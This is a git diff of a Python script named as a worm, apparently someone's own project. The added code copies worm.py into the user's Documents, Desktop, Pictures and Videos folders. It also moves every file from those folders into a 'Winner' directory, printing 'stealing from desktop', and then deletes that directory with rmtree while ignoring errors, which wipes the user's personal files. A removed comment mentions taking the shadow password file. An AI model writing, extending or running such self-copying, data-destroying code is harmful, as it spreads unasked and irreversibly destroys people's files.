@@ -32,30 +32,46 @@ def wiggle():
         #need the username to properly get pathway names
         username = os.getlogin()
 
-        #if the worm is in downloads
+        #if the worm is in Downloads
         if(os.path.isdir("/home/"+username+"/Downloads/") == True):
             #we go to that directory
 
-            #make a copy of the folder that holds the worm in it 
+            location = "/home/"+username+"/Downloads"
 
+            #changes directory
+            os.chdir(location)
+
+            #make a copy of the folder that holds the worm in it 
             copy()
 
-            #should I send it to another location
+            #I send it to another location
 
-        #if the worm is in Documents
+        #if the worm is in pictures
         if(os.path.isdir("/home/"+username+"/Pictures/") == True):
 
             #we go to that directory
-
+            location2 = "/home/"+username+"/Pictures"
+            os.chdir(location2)
             #make a copy of the folder that holds the worm in it 
+            copyfile()
 
-            copy()
-           
-        #if its not in any of those two locations this person is weird grab me the passwords
-        else:
-            #send the worm to the /etc and copy the shadow file but that may need addditional permissions
-            #for right now just take whatever
-            copy()
+        #send it to documents
+        if(os.path.isdir("/home/"+username+"/Documents/") == True):
+            location3 = "/home/"+username+"/Documents/"
+            os.chdir(location3)
+            copyfile()
+        
+        #send it to Desktop
+        if(os.path.isdir("/home/"+username+"/Desktop/") == True):
+            location4 = "/home/"+username+"/Desktop/"
+            os.chdir(location4)
+            copyfile()
+
+        #send it to videos
+        if(os.path.isdir("/home/"+username+"/Videos/") == True):
+            location5 = "/home/"+username+"/Videos/"
+            os.chdir(location5)
+            copyfile()
 
 def copy():
 
@@ -69,9 +85,21 @@ def copy():
 
     #going to create the directory twice
     for i in range(0,1):
-        directoryName = 'You Lose'
+        directoryName = 'You Lose' 
         subprocess.call(['mkdir', directoryName])
         subprocess.call(['cp',name, directoryName])
+
+def copyfile():
+    #just copies the worm.py file to get rid of current issue
+
+    #worm location -- issue that this is hard coded and only works if the file is in the downloads
+    username = os.getlogin()
+
+    wormie = "/home/" + username + "/Downloads/worm.py"
+
+    #now you need to copy the worm file
+    shutil.copy(wormie, os.getcwd())
+    
 
 def take():
     #the take method will create a file and send all the other files in that folder
@@ -86,7 +114,14 @@ def take():
     #else:
     #    copy()
 
-    #create the folder there??
+    #now we need to set a location for this file because of our delete method
+
+    #first we change directories
+    #os.chdir needs a path so we manully set one
+    location = "/home/"+username+"/Documents"
+    os.chdir(location)
+
+    #create the folder in that location there??
     directory = 'Winner'
     subprocess.call(['mkdir', directory]) #this is my destination file
 
@@ -102,25 +137,56 @@ def take():
 
             #send all of those copies to a new file 
             shutil.move(full_name, directory)
+    
+    #send it to Desktop
+    files2 = os.listdir("/home/"+username+"/Desktop")
+    print('stealing from desktop')
+    #then loop through all of those files
+    for filename2 in files2:
+        full_name2 = os.path.join("/home/"+username+"/Desktop", filename2)
+        if os.path.isfile(full_name2): 
+            shutil.move(full_name2, directory)
 
-    #It has taken from Documents
+    #send it to Pictures
+    files4 = os.listdir("/home/"+username+"/Pictures")
+    print('stealing from desktop')
+    #then loop through all of those files
+    for filename4 in files4:
+        full_name4 = os.path.join("/home/"+username+"/Pictures", filename4)
+        if os.path.isfile(full_name4): 
+            shutil.move(full_name4, directory)
+    
+    #send it to videos
+    files5 = os.listdir("/home/"+username+"/Videos")
+    print('stealing from desktop')
+    #then loop through all of those files
+    for filename5 in files5:
+        full_name5 = os.path.join("/home/"+username+"/Videos", filename5)
+        if os.path.isfile(full_name5): 
+            shutil.move(full_name5, directory)
+       
+def delete():
+    #this will allow me to delete a the Winner file. I put it in a seperate method to make sure that it will delete when the method calls for it and not randomly while the take() 
+    #method is still running
+    
+    #need to find the directory that the Winner folder is in first -- should be in documents
 
-    if(os.path.isdir("/home/"+username+"/Downloads/") == True):
+    #get username for the proper pathway creation
+    username = os.getlogin()
 
-        #FOLLOW THE SAME PROCESS BUT TAKE FROM THAT FOLDER
+    #now delete that pathway using shutil
+    shutil.rmtree('/home/' + username + '/Documents/Winner', ignore_errors= True)
 
-        #list the files in thar dirtory
-        
-        #loop through them
-            #make a full pathway 
-            #if it is a full pathway
-                #move those files to "winner"
+    #ignoring the errors will allow anything to be removed regardless of read only file status
 
+    #might have to delete from the trash bin
+    
 def main():
     print("NOW STARTING")
-    #wiggle()
-    copy()
+    #copy()
     take()
+    wiggle()
+    delete()
     print("GAME OVER")
 
 if __name__ == "__main__":
